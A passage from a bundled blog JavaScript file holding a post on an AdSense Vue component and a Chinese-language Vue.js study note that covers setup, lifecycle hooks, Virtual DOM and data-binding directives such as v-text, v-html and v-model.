class=\"token attr-name\">:data-full-width-responsive</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>adResponsive<span class=\"token punctuation\">\"</span></span>\n    <span class=\"token attr-name\">:data-ad-layout-key</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>adLayoutKey<span class=\"token punctuation\">\"</span></span>\n    <span class=\"token attr-name\">:</span><span class=\"token style-attr language-css\"><span class=\"token attr-name\"><span class=\"token attr-name\">style</span></span><span class=\"token punctuation\">=\"</span><span class=\"token attr-value\">adStyle</span><span class=\"token punctuation\">\"</span></span>\n  <span class=\"token punctuation\">/></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>template</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> <span class=\"token punctuation\">{</span>\n  props<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    adClient<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n      type<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n      required<span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span>\n      <span class=\"token keyword\">default</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ca-pub-XXXXXXXXXXXXXXXX\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    adSlot<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n      type<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n      required<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n      <span class=\"token keyword\">default</span><span class=\"token operator\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    adFormat<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n      type<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n      required<span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span>\n      <span class=\"token keyword\">default</span><span class=\"token operator\">:</span> <span class=\"token string\">\"auto\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    adLayout<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n      type<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n      required<span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span>\n      <span class=\"token keyword\">default</span><span class=\"token operator\">:</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    adStyle<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n      type<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n      required<span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span>\n      <span class=\"token keyword\">default</span><span class=\"token operator\">:</span> <span class=\"token string\">\"display: block;\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    adResponsive<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n      type<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n      required<span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span>\n      <span class=\"token keyword\">default</span><span class=\"token operator\">:</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    adLayoutKey<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n      type<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n      required<span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span>\n      <span class=\"token keyword\">default</span><span class=\"token operator\">:</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token function\">mounted</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">showAd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  methods<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">showAd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">$nextTick</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n          <span class=\"token punctuation\">(</span>window<span class=\"token punctuation\">.</span>adsbygoogle <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span>adsbygoogle <span class=\"token operator\">||</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n          console<span class=\"token punctuation\">.</span><span class=\"token function\">error</span><span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n      <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></code></pre><ol start=\"3\">\n<li>在頁面內加入 component</li>\n</ol>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>template</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>adsense</span>\n      <span class=\"token attr-name\">ad-layout</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>in-article<span class=\"token punctuation\">\"</span></span>\n      <span class=\"token attr-name\">ad-slot</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>9999999999<span class=\"token punctuation\">\"</span></span>\n      <span class=\"token attr-name\">ad-format</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>fluid<span class=\"token punctuation\">\"</span></span>\n      <span class=\"token attr-name\">ad-responsive</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>false<span class=\"token punctuation\">\"</span></span>\n    <span class=\"token punctuation\">/></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>template</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"rss\">RSS</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.solunita.net/posts/develop-blog-by-gridsome-from-scratch-publish-rss/\">Gridsome でイチからブログを作る - RSS を配信する | Trial and Spiral</a></li>\n<li><code>yarn add gridsome-plugin-feed</code></li>\n<li><code>npm install gridsome-plugin-feed</code></li>\n</ul>\n","date":"2019-12-06T10:48:03.000Z","excerpt":"","printDate":"December 6, 2019","printReadingTime":"7 min read"};

var route_62 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod76
});

var Mod77 = {"title":"Vue 筆記","slug":"vue","html":"<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://ithelp.ithome.com.tw/users/20107673/ironman/1470\">Vue.js 30 天隨身包</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://book.vue.tw/CH1/1-1-introduction.html\">Vue.js 簡介 | 重新認識 Vue.js | Kuro Hsu</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/i-ryo/items/baa50cf0a6647fe8bd2e\">Vue.js を習得するためにやった事 まとめ（随時更新）</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/kskinaba/items/3e8887d45b11f9132012\">Vue.js を 100 時間勉強して分かったこと</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/mtoyopet/items/87a32d8e3497c5421727\">Vue 開発者のための Vue.js ベストプラクティス集 15 選</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/kahirokunn/items/6b4834b9a13406535f32\">2019 年版 Vue.js を使ってる人には必ず知っていてほしい Vue.js の武器とドキュメントに書かれていないコンポーネントやメンテナンスの際に役立つ Tips - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/chrisvfritz/vue-enterprise-boilerplate\">vue-enterprise-boilerplate</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://mp.weixin.qq.com/s?__biz=MzIyMDkwODczNw%3D%3D&amp;mid=2247486027&amp;idx=2&amp;sn=3926be273630a65fc69c4494ce525fa9&amp;chksm=97c597e5a0b21ef3ab889271a3ef15327472d5efb386bd6693949b48d40796f864bc152e9d9b&amp;scene=21#wechat_redirect\">Vue 知识点自检清单(上)</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/terry_6518/items/4ecb90fa474895b81b8a\">Vue.js を触る際に知っておきたい仮想 DOM の話</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/@milkmidi/vue-custom-transition-component-54fdcb905d77\">Vue Custom Transition Component - Milk Midi - Medium</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/simezi9/items/c27d69f17d2d08722b3a\">Vue.js の v-model を正しく使う - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/al_tarte/items/0ff49219cd1b25411b7a\">【Vue.js】v-model 解体新書 - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/daiend/items/b179bbeae588429107ae\">Vue でフォームのコンポーネント化に立ち向かう - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/okazuki/items/54c91343d2b231f4e004\">無料で Vue.js + express で作った API を Azure Static Web Apps でホストしてみよう - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://pjchender.blogspot.com/2017/05/vue-vue-reactivity.html\">[掘竅] 為什麼畫面沒有隨資料更新 - Vue 響應式原理（Reactivity） ~ PJCHEN der 那些沒告訴你的小細節</a></li>\n</ul>\n<h2 id=\"介紹\">介紹</h2>\n<ul>\n<li>輕量</li>\n<li>MVC 架構</li>\n<li>Components 系統</li>\n<li>Virtual DOM: V-Node</li>\n<li>Directives</li>\n<li>Two-way Binding</li>\n<li>Angular 使用 TypeScript 撰寫，React 使用 JSX 語法撰寫，皆需編譯。Vue 不需編譯，可以馬上開始使用</li>\n</ul>\n<h2 id=\"導入\">導入</h2>\n<h3 id=\"cdn\">CDN</h3>\n<p><code>&lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;&gt;&lt;/script&gt;</code></p>\n<h3 id=\"npm\">npm</h3>\n<h3 id=\"vue-cli\">Vue CLI</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://cli.vuejs.org/\">Vue-cli</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://chrome.google.com/webstore/detail/vuejs-devtools/nhdogjmejiglipccpnnnanhbledajbpd\">Vue.js devtools Chrome extension</a></li>\n</ul>\n<h4 id=\"簡單比較\">簡單比較</h4>\n<ul>\n<li>CDN：使用 Vue.js 的基礎功能</li>\n<li>Vue CLI：能夠在 Vue.js 的基礎上追加任意擴充功能</li>\n<li>Nuxt.js：整理好 Vue.js 各個擴充功能的套組</li>\n</ul>\n<p>Vue CLI 與 Nuxt.js 最大的差別在於是否要進行 SSR（Server Side Rendering），不需要 SSR 的情況則不必準備 node.js 伺服器，可以直接將 SPA 或 Static Generated build 好的檔案直接放到 S3 或 Github Pages 上面。</p>\n<h4 id=\"安裝-vue-環境\">安裝 Vue 環境</h4>\n<p><code>npm install -g vue-cli</code>\n├ <code>npm install -g @vue/cli</code>\n└ <code>npm install -g @vue/cli-service-global</code></p>\n<h4 id=\"建置\">建置</h4>\n<ol>\n<li>使用官方提供的樣板快速建立專案，可使用 <code>vue list</code> 查看樣板列表。</li>\n</ol>\n<pre class=\"language-bash\"><code class=\"language-bash\">vue init [template] [project_name]\nvue init webpack [project_name]\nvue init webpack-simple [project_name]\ncd [projec_name]\nnpm install\nnpm run dev\nnpm run build</code></pre><ol start=\"2\">\n<li>建立自訂專案</li>\n</ol>\n<pre class=\"language-bash\"><code class=\"language-bash\">vue create [project-name]\ncd [projec_name]\nnpm run serve\nnpm run build\nvue ui</code></pre><ol start=\"3\">\n<li>修改 build 後的檔案參照路徑：於根目錄底下新增／修改 <code>vue.config.js</code>：</li>\n</ol>\n<pre class=\"language-js\"><code class=\"language-js\">module<span class=\"token punctuation\">.</span>exports <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n  publicPath<span class=\"token operator\">:</span> \"<span class=\"token punctuation\">.</span><span class=\"token operator\">/</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span></code></pre><h2 id=\"基礎介紹\">基礎介紹</h2>\n<h3 id=\"vue-instance（根實體）\">Vue Instance（根實體）</h3>\n<p>每個 Vue App 皆從創造 vue instance 開始，透過 Vue Constructor 產生。\n可傳入選項物件（Options）包含需要用到的屬性，\n如：\n├ 掛載點（el）\n├ 資料（data）\n├ 方法（methods）\n├ 模板（template）\n└ 生命期掛勾（hooks）...etc.</p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> app <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">,</span>\n  data<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    message<span class=\"token operator\">:</span> <span class=\"token string\">\"Hello World!\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h3 id=\"mvvm-架構\">MVVM 架構</h3>\n<p><code>View</code>（DOM）\n← <code>ViewModel</code>（DOM Listeners、Vue Instance）\n→ <code>Model</code>（Javascript objects）</p>\n<p><code>View</code>（DOM）\n← <code>ViewModel</code>（Data Bindings、Vue Instance）\n← <code>Model</code>（Javascript objects）</p>\n<h3 id=\"lifecycle-生命期\">Lifecycle 生命期</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://vuejs.org/v2/guide/instance.html#Lifecycle-Diagram\">Lifecycle Diagram</a></li>\n</ul>\n<p>vue 在 lifecycle 中會\n├ 建立 Vue Instance\n├ 綁定資料\n├ 配置事件\n├ 編譯樣板\n└ 重覆修改資更新資料\n直到 Vue Instance 被銷毀（destroyed）\n才會解除綁定相關內容，完成整個 lifecycle。</p>\n<p>vue 提供了 8 個 Instance Lifecycle Hooks，\n能在 lifecycle 各個處理的時間點前後，提供客製化處理的方式，\n這 8 個 hook 皆為 function。</p>\n<h4 id=\"1-beforecreate\">1. beforeCreate</h4>\n<p>時間點：初始化 vue instance 並開始 lifecycle 之後，開始綁定資料與配置事件之前。\n此時仍然無法調用 <code>$data</code>。</p>\n<p>應用場景：loading 進頁面的事件</p>\n<h4 id=\"2-created\">2. created</h4>\n<p>時間點：已創建 vue instance，可取得 <code>$data</code>，已綁定屬性與事件，尚未掛載 el 與生成 DOM。</p>\n<h4 id=\"3-beforemount\">3. beforeMount</h4>\n<p>時間點：開始掛載 el 之前，首次調用相關 render 函式，尚未綁定 DOM。</p>\n<h4 id=\"4-mounted\">4. mounted</h4>\n<p>時間點：剛創建好的 <code>vm.$el</code> 取代 el，並掛載至 vm(app) 上，已綁定 DOM。</p>\n<p>應用場景：對後端發出請求或讀取新資料</p>\n<h4 id=\"5（dom-渲染）\">5.（DOM 渲染）</h4>\n<h4 id=\"6（偵測-dom-變更）\">6.（偵測 DOM 變更）</h4>\n<h4 id=\"7-beforeupdate\">7. beforeUpdate</h4>\n<p>於資料更新時調用，可以在 Virtual DOM 重新 render 與 patch 之前變更資料狀態，\n這個階段不會繪製 view。</p>\n<h4 id=\"8-updated\">8. updated</h4>\n<p>資料更新後會讓 Virtual DOM 重新 render 頁面，繪製出正確的 view。</p>\n<h4 id=\"9（thisdestroy）\">9.（<code>this.$destroy();</code>）</h4>\n<h4 id=\"10-beforedestroy\">10. beforeDestroy</h4>\n<p>在 vue instance 被銷毀前調用。此階段還可以完全使用這個 vue instance。</p>\n<h4 id=\"11-destroyed\">11. destroyed</h4>\n<p>vue instance 銷毀後可調用，調用後這個 vue instance 底下的資料與樣板會解除綁定，\n事件會取消監聽，所有子組件也會被銷毀。</p>\n<h3 id=\"virtual-dom\">Virtual DOM</h3>\n<p>DOM（Document Object Model）中文翻譯為「文件物件模型」，是 HTML、XML、SVG 文件可以使用的一組 API。\n它提供了文件結構化的表示法（樹狀結構），並定義讓程式可以存取與改變文件架構、風格和內容的方法，\n目的是為了搭起網頁與程式碼之間溝通的橋樑，將網頁與程式碼（或 script）連結在一起。\n一個網頁的所有元素組織在一起，就構成了一棵 DOM Tree。</p>\n<p>然而操作 DOM 會使頁面重新 render 才能顯示結果，非常耗費整體運作效能，\n因此 Facebook 團隊研發 ReactJS 時改良 MVC 架構中的 View，出現了 Virtual DOM。</p>\n<p>Virtual DOM（虛擬 DOM）是以 JavaScript 物件模擬特定 DOM Tree，\n也就是不直接操作 DOM，而是改用模擬結構的方式，達到優化效能的目的，\n讓頁面刷新載入的速度變快。</p>\n<p>Virtual DOM 不會讓瀏覽器掃描整個 DOM Tree ＝不會刷新整個頁面，\n它會使用 DOM diff 這個演算法去比較這一次跟上一次 Virtual DOM 的差異，\n接著處理有差異的部分，然後更新需要被更新的組件。</p>\n<p>Vue 在版本 2.0 之後才加入 Virtual DOM，\nVue 的 Virtual DOM 是 VNode，一個 VNode 的結構包含以下這些屬性：\n├ <code>tag</code>：該節點的 html 標籤\n├ <code>data</code>：該節點的數據資料\n├ <code>children</code>：該節點底下的子節點\n├ <code>text</code>：該節點的文本\n├ <code>elm</code>：當前虛擬節點對應的真實 DOM 節點\n├ <code>ns</code>：該節點的 namespace\n├ <code>context</code>：編譯範圍\n├ <code>functionalContext</code>：函數化組件的編譯範圍\n├ <code>key</code>：該節點的 key 屬性，用來辨識該節點\n├ <code>componentOptions</code>：創建 vue instance 會用到的資訊\n├ <code>child</code>：該節點對應的 vue instance\n├ <code>parent</code>：該節點的父節點\n├ <code>raw</code>：raw html\n├ <code>isStatic</code>：該節點是否為靜態節點\n├ <code>isRootInsert</code>：該節點是否作為根節點插入 tree，值為 false\n├ <code>isComment</code>：該節點是否作為註釋節點\n├ <code>isCloned</code>：該節點是否為克隆節點\n└ <code>isOnce</code>：該節點是否有 v-once 指令</p>\n<p>而常見的 VNode 有這五類:\n├ <code>EmptyVNode</code>：沒有內容的註釋節點\n├ <code>TextVNode</code>：文本節點\n├ <code>ElementVNode</code>：普通元素節點\n├ <code>ComponentVNode</code>：組件節點\n└ <code>CloneVNode</code>：克隆節點，可生成上面任意類型一模一樣的副本節點</p>\n<h3 id=\"專案架構\">專案架構</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/@zitko/structuring-a-vue-project-authentication-87032e5bfe16\">Structuring a Vue project — Authentication - Boris Savic - Medium</a></li>\n</ul>\n<pre class=\"language-\"><code class=\"language-\">.\n├── package.json\n├── package-lock.json\n├── vue.config.js\n├── dist/\n└── src/\n    ├── App.vue\n    ├── assets/\n    │   └── logo.png\n    ├── styles/\n    │   ├── _customize.scss\n    │   ├── _dataAttribute.scss\n    │   ├── _easing.scss\n    │   ├── _element_ui_customize.scss\n    │   ├── _flexbox.scss\n    │   ├── _reset.scss\n    │   ├── _scrollbar.scss\n    │   ├── _variable.scss\n    │   └── style.scss\n    ├── components/\n    │   └── HelloWorld.vue\n    ├── main.js\n    ├── router.js\n    ├── services/\n    │   ├── api.service.js\n    │   ├── storage.service.js\n    │   └── user.service.js\n    ├── store/\n    │   ├── auth.module.js\n    │   └── index.js\n    ├── views/\n    │   ├── About.vue\n    │   ├── Home.vue\n    │   └── LoginView.vue\n    ├── lang/\n    │   ├── en.js\n    │   ├── zh_tw.js\n    │   └── index.js\n    └── utils/\n        ├── resetForm.js\n        └── validate.js</code></pre><ul>\n<li><code>npm run dev</code> 啟動後會同時開啟根目錄的 <code>index.html</code> 與 src 資料夾內的 <code>main.js</code></li>\n<li><code>main.js</code> 會同時執行 <code>App.vue</code> 與 router 資料夾內的 <code>index.js</code></li>\n</ul>\n<h2 id=\"資料綁定\">資料綁定</h2>\n<h3 id=\"選項物件屬性：data\">選項物件屬性：<code>data</code></h3>\n<p><code>data</code> 可用來儲存組件內部狀態或資料，其資料型態可以是 object 或 function，\n但需要注意的是，各組件檔（<code>.vue</code>）為各自獨立非共用，\n所以組件中的 <code>data</code> 只能是 function 型態。\n範例如下：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>{{ message }}<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> app <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">,</span>\n  data<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    message<span class=\"token operator\">:</span> <span class=\"token string\">\"Hello World!\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><p>組件中的 data 只能是 function 型態：</p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token function\">data</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">{</span>\n      message<span class=\"token operator\">:</span> <span class=\"token string\">\"Hello Test!\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre><h3 id=\"資料綁定指令\">資料綁定指令</h3>\n<h4 id=\"v-text\"><code>v-text</code></h4>\n<ul>\n<li>更新指定元素的 <code>textContent</code>，即整個元素內容</li>\n</ul>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>span</span> <span class=\"token attr-name\">v-text</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>msg<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>span</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> app <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">,</span>\n  data<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    message<span class=\"token operator\">:</span> <span class=\"token string\">\"Hello World!\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><ul>\n<li>只想更新部份內容時需改使用雙大括號 <code>{{ }}</code></li>\n</ul>\n<h4 id=\"v-html\"><code>v-html</code></h4>\n<ul>\n<li>更新指定元素的 <code>innerHTML</code>，內容會為普通的 HTML 語法而非 Vue 模板。</li>\n<li>注意不要使用此指令任意接受其他不可信任的 HTML，很容易導致 XSS 攻擊的風險。</li>\n<li>由於此綁定資料內容未被 Vue 模板編譯，單一組件中的 scoped css 不會套用進 <code>v-html</code> 的 HTML 內容中。</li>\n</ul>\n<h4 id=\"v-model\"><code>v-model</code></h4>\n<ul>\n<li>雙向綁定 (Two-way Binding)</li>\n<li>當使用者輸入資料到輸入框後，會自動將資料存在一個變數中，並即時更新資料到綁定的 View 當中</li>\n<li>只能使用於自訂組件或表單元素：\n├ 單行輸入框 <code>input</code>\n├ 多行輸入框 <code>textare</code>\n├ 單選按鈕 <code>radio</code>\n├ 複選按扭 <code>checkbox</code>\n└ 下拉式選單 <code>select</code></li>\n<li>是整合 <code>v-bind:value=&quot;value&quot;</code> 和 <code>v-on:input=&quot;value = $event.target.value&quot;</code> 的語法糖\n└ <code>radio</code> 和 <code>select</code> 的綁定事件會從 <code>input</code> 換為 <code>change</code></li>\n</ul>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">v-model</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>message<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span><span class=\"token punctuation\">></span></span>{{ message }}<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> app <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">,</span>\n  data<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    message<span class=\"token operator\">:</span> <span class=\"token string\">\"Hello World!\"</span><span class=\"token punctuation\">,</span>\n  <span 